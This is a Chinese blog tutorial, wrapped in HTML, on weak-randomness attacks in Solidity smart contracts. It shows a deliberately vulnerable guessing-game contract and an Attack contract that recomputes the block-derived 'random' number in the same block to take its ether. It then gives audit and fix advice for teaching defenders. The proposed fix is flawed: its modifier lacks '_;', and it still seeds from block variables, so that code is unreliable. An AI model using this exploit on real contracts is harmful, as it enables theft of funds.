@@ -1,0 +1,194 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>12.随机数攻击 | solidity life</title><meta name="author" content="LEVI_104"><meta name="copyright" content="LEVI_104"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="随机数攻击前置知识智能合约的开发中常常会用到随机数，例如 Lottery 和现在流行的 NFT 数字藏品的属性等都需要用到随机数。目前来说常见的随机数获取有两种：使用区块变量生成随机数，使用预言机来生成随机数。下面我们了解一下这两者的特点：  使用区块变量生成随机数（我们先了解一下常见的区块变量有哪些） block.basefee(uint)：当前区块的基本费用 block.chainid(uin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="12.随机数攻击">
+<meta property="og:url" content="http://example.com/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/12.%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="solidity life">
+<meta property="og:description" content="随机数攻击前置知识智能合约的开发中常常会用到随机数，例如 Lottery 和现在流行的 NFT 数字藏品的属性等都需要用到随机数。目前来说常见的随机数获取有两种：使用区块变量生成随机数，使用预言机来生成随机数。下面我们了解一下这两者的特点：  使用区块变量生成随机数（我们先了解一下常见的区块变量有哪些） block.basefee(uint)：当前区块的基本费用 block.chainid(uin">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f">
+<meta property="article:published_time" content="2022-12-18T11:27:29.613Z">
+<meta property="article:modified_time" content="2022-12-18T11:42:39.584Z">
+<meta property="article:author" content="LEVI_104">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f"><link rel="shortcut icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0"><link rel="canonical" href="http://example.com/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/12.%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '12.随机数攻击',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-12-18 19:42:39'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s1.vika.cn/space/2022/11/27/638555bfd98049caacc20724b56b4fb6" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">solidity life</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">12.随机数攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-18T11:27:29.613Z" title="发表于 2022-12-18 19:27:29">2022-12-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-18T11:42:39.584Z" title="更新于 2022-12-18 19:42:39">2022-12-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/09-%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/">09.安全审计</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="随机数攻击"><a href="#随机数攻击" class="headerlink" title="随机数攻击"></a>随机数攻击</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>智能合约的开发中常常会用到随机数，例如 Lottery 和现在流行的 NFT 数字藏品的属性等都需要用到随机数。目前来说常见的随机数获取有两种：使用区块变量生成随机数，使用预言机来生成随机数。下面我们了解一下这两者的特点：</p>
+<ul>
+<li>使用区块变量生成随机数（我们先了解一下常见的区块变量有哪些）<ul>
+<li>block.basefee(uint)：当前区块的基本费用</li>
+<li>block.chainid(uint)：当前链 id</li>
+<li>block.coinbase()：当前区块矿工地址 address payable</li>
+<li>block.difficulty(uint)：当前区块难度</li>
+<li>block.gaslimit(uint)：当前区块 gaslimit</li>
+<li>block.number(uint)：当前区块号</li>
+<li>block.timestamp(uint)：自 Unix 纪元以来的当前区块时间戳（以秒为单位）</li>
+<li>blockhash(uint blockNumber) returns (bytes32)：给定区块的哈希，仅适用于 256 个最近的区块</li>
+</ul>
+</li>
+</ul>
+<p>其中 block.difficulty, blockhash, block.number 和 block.timestamp 这四个是用得比较多的。由区块数据生成的随机数可能会限制普通用户预测随机数的可能性，但是并不能限制矿工作恶，矿工可以决定一个区块是否被广播，他们挖出了一个区块不是一定要广播出去也可以直接扔掉，这个就叫<strong>矿工的选择性打包</strong>。他们可以持续尝试生成随机数，直至得到想要的结果再广播出去。当然，矿工会这样做的前提是有足够的的利益诱惑，例如可以获得一个很大的奖励池中的奖励，因此使用区块变量获取随机数的方法更适合于一些随机数不属于核心业务的应用。</p>
+<ul>
+<li>使用预言机生成随机数</li>
+</ul>
+<p>预言机是专门为生成随机数种子而搭建的链上或者链下的服务。除了使用第三方服务，也可以由 DApp 开发商自己搭建一个链下服务提供随机数，这种在链上获取链下数据的场景通常是通过链上预言机的方式来实现。</p>
+<p>当然这种方法也会有一些安全风险，例如依赖第三方给出的随机数种子的话同样会存在第三方作弊或者受贿的情形，即使是自己搭建的随机数服务也可能因为故障等原因无法使用，项目方也有可能操控随机数对 DApp 的运行和用户造成重大的损失。因此使用链下服务获取随机数的方法依赖于是否有一个可信又稳定的第三方服务，如果有，那么这个方法相较于使用区块链变量生成随机数的方法，随机数的不可预测性会更强一些。</p>
+<p>说到这里大家可能会有一些疑问，这些随机数生成方式或多或少都存在一定风险，那么就没有一个既稳定又安全的随机数获取方式吗？答案是有，有很多去中心化的预言机服务，以 Chainlink 为例，这类去中心化的预言机服务提供的随机数相对更加稳定和安全。Chainlink VRF 提供了一个链上去中心化的随机数种子获取方案。只要付出 Link 币就可以从 Chainlink 上获取随机数种子了，至于他们的各种优点和使用方式这里就不过多介绍了。</p>
+<p>接下来我们还是用合约代码来给大家演示弱随机数可能带来的危害。</p>
+<h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">contract GuessTheRandomNumber &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint _guess) public &#123;</span><br><span class="line">        uint answer = uint(</span><br><span class="line">            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (_guess == answer) &#123;</span><br><span class="line">            (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class="line">            require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先我们先来了解一下代码中的两个函数，abi.encodePacked 和 keccak256：</p>
+<ul>
+<li><p>abi.encodePacked 对参数进行编码，solidity 提供两种编码方法 encode 和 encodePacked，前者对每一个参数进行 32 字节补齐，后者不进行补齐而是直接将待编码参数连接起来。</p>
+</li>
+<li><p>keccak256 哈希算法，可以将任意长度的输入压缩成 64 位的 16 进制的数，且哈希碰撞的概率近乎为 0。</p>
+</li>
+</ul>
+<p>接下来我们来看合约代码，这个合约是一个猜数字赢以太的游戏，我们可以看到，部署者使用上个区块的区块哈希和区块时间作为随机数种子生成随机数，我们只需要模拟他的随机数生成方法就可以得到奖励。下面我们来看攻击合约：</p>
+<h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function attack(GuessTheRandomNumber guessTheRandomNumber) public &#123;</span><br><span class="line">        uint answer = uint(</span><br><span class="line">            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        guessTheRandomNumber.guess(answer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先我们先来分析攻击流程：</p>
+<ol>
+<li>Alice 使用一个以太币部署 GuessTheRandomNumber 合约；</li>
+<li>Eve 部署 Attack 合约调用 attack() 函数并传入 GuessTheRandomNumber 合约的地址；</li>
+<li>Eve 赢得一个以太币。</li>
+</ol>
+<p>这次的攻击可以说是本系列文章创编以来最简单的了，咋回事呢：</p>
+<p>首先，Attack.attack() 模拟了 GuessTheRandomNumber 合约中随机数的生成方式生成随机数后，调用 guessTheRandomNumber.guess() 并将生成的随机数传入，由于从 Attack.attack() 生成随机数到调用 guessTheRandomNumber.guess() 都是在同一区块中完成的，且<strong>在同一区块中 block.number 和 block.timestamp 这两个参数是不变的</strong>，所以，Attack.attack() 和 guessTheRandomNumber.guess() 这两个函数生成的随机数的结果是相同的，从而攻击者可以顺利通过 if(_guess &#x3D;&#x3D; answer) 判断得到奖励。</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>作为开发者</strong></p>
+<p>如果随机数属于非核心业务，可以使用未来区块哈希来生成随机数，也就是将猜数和领奖分开做异步处理。我针对这次的漏洞合约写了一个优化版本，大家可以看下（由于漏洞合约中使用了区块时间和区块哈希来生成一个 256 位的随机数，这无疑很大程度上增加了猜测的难度，对于玩家来说非常的不方便，这里为了契合原漏洞合约我就不做修改了）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">contract GuessTheRandomNumber &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line">    uint256 public deadline = block.timestamp + 72 hours;</span><br><span class="line">    mapping ( address =&gt; uint256 ) public Answer;</span><br><span class="line"></span><br><span class="line">    modifier isTime()&#123;</span><br><span class="line">        require(block.timestamp &gt; deadline , &quot;Not the time!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Guess(address,uint256);</span><br><span class="line">    event Claim(address);</span><br><span class="line"></span><br><span class="line">    function guess(uint256 _guess) public &#123;</span><br><span class="line">        require(block.timestamp &lt;= deadline , &quot;Too late!&quot;);</span><br><span class="line">        Answer[msg.sender] = _guess;</span><br><span class="line">        emit Guess(msg.sender,_guess);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function claim() public isTime&#123;</span><br><span class="line">        uint256 key = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));</span><br><span class="line">        uint256 answer = Answer[msg.sender];</span><br><span class="line">        require(key == answer , &quot;Sorry,may be next time.&quot;);</span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">        emit Claim(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大家其实可以看到，我添加了 deadline 参数将 guess 和 claim 做了异步处理，在部署合约后的 72 小时内可以调用 guess() 猜随机数，在 72 小时后 guess() 关闭 claim() 开启，玩家可以通过 claim() 来验证自己是否猜中。当然，这个修复合约并不是完美的解决方案，正如前置知识中提到的，如果矿工来玩的话他可以在打包的时候知道自己是否猜中，如果猜中打包上链，如果没有猜中放弃打包（相信没有任何一个矿工愿意为了得到一个以太而付出这么大的代价）。所以最优的解决办法还是接入知名预言机来获取随机数。</p>
+<p><strong>作为审计者</strong></p>
+<p>作为审计者在审计过程中遇到随机数，需要重点关注随机数种子来源，几乎所有使用区块变量都逃不脱被矿工作恶的可能。遇到使用第三方提供的随机数种子时，应提醒项目方确认其来源是否百分百可靠，避免第三方作恶或硬件问题造成损失。在可能的情况下应当建议项目方接入知名预言机来获取安全的随机数。</p>
+<p>引用：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/2_2GsyZ54Vs8Trcbg4766g">慢雾科技</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">LEVI_104</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/12.%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/">http://example.com/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/12.%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">solidity life</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://s1.vika.cn/space/2022/11/28/fe281a55d40a494a81c5b33f7f592aca" target="_blank"><img class="post-qr-code-img" src="https://s1.vika.cn/space/2022/11/28/fe281a55d40a494a81c5b33f7f592aca" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://s1.vika.cn/space/2022/11/28/facf145842a64b25ba613a98f6f65a7e" target="_blank"><img class="post-qr-code-img" src="https://s1.vika.cn/space/2022/11/28/facf145842a64b25ba613a98f6f65a7e" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/13.%E5%9F%BA%E4%BA%8Etx.origin%E7%9A%84%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/"><img class="prev-cover" src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">13.基于tx.origin的钓鱼攻击</div></div></a></div><div class="next-post pull-right"><a href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/11.%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"><img class="next-cover" src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">11.拒绝服务攻击</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s1.vika.cn/space/2022/11/27/638555bfd98049caacc20724b56b4fb6" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LEVI_104</div><div class="author-info__description">始生有物，其形必丑</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/chen4903"><i class="fab fa-github"></i><span>关注</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8" target="_blank" title="Twitter"><i class="fa-brands fa-twitter"></i></a><a class="social-icon" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0" target="_blank" title="WeChat"><i class="fa-brands fa-weixin"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">随机数攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="toc-number">1.4.</span> <span class="toc-text">攻击合约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.5.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/18/03.solidity%E8%BF%9B%E9%98%B6/04.%E6%8F%92%E6%A7%BD&amp;%E6%9F%A5%E8%AF%A2%E9%93%BE%E4%B8%8A%E6%95%B0%E6%8D%AE/" title="04.插槽&amp;查询链上数据"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="04.插槽&amp;查询链上数据"/></a><div class="content"><a class="title" href="/2022/12/18/03.solidity%E8%BF%9B%E9%98%B6/04.%E6%8F%92%E6%A7%BD&amp;%E6%9F%A5%E8%AF%A2%E9%93%BE%E4%B8%8A%E6%95%B0%E6%8D%AE/" title="04.插槽&amp;查询链上数据">04.插槽&amp;查询链上数据</a><time datetime="2022-12-18T14:56:14.388Z" title="发表于 2022-12-18 22:56:14">2022-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/" title="16.访问私有数据攻击"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="16.访问私有数据攻击"/></a><div class="content"><a class="title" href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/" title="16.访问私有数据攻击">16.访问私有数据攻击</a><time datetime="2022-12-18T12:24:47.266Z" title="发表于 2022-12-18 20:24:47">2022-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/15.delegatecall%E6%BC%8F%E6%B4%9E_3/" title="15.delegatecall漏洞_3"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="15.delegatecall漏洞_3"/></a><div class="content"><a class="title" href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/15.delegatecall%E6%BC%8F%E6%B4%9E_3/" title="15.delegatecall漏洞_3">15.delegatecall漏洞_3</a><time datetime="2022-12-18T12:11:24.128Z" title="发表于 2022-12-18 20:11:24">2022-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/14.delegatecall%E6%BC%8F%E6%B4%9E_2/" title="14.delegatecall漏洞_2"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="14.delegatecall漏洞_2"/></a><div class="content"><a class="title" href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/14.delegatecall%E6%BC%8F%E6%B4%9E_2/" title="14.delegatecall漏洞_2">14.delegatecall漏洞_2</a><time datetime="2022-12-18T11:57:34.434Z" title="发表于 2022-12-18 19:57:34">2022-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/13.%E5%9F%BA%E4%BA%8Etx.origin%E7%9A%84%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/" title="13.基于tx.origin的钓鱼攻击"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="13.基于tx.origin的钓鱼攻击"/></a><div class="content"><a class="title" href="/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/13.%E5%9F%BA%E4%BA%8Etx.origin%E7%9A%84%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/" title="13.基于tx.origin的钓鱼攻击">13.基于tx.origin的钓鱼攻击</a><time datetime="2022-12-18T11:44:01.293Z" title="发表于 2022-12-18 19:44:01">2022-12-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LEVI_104</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" 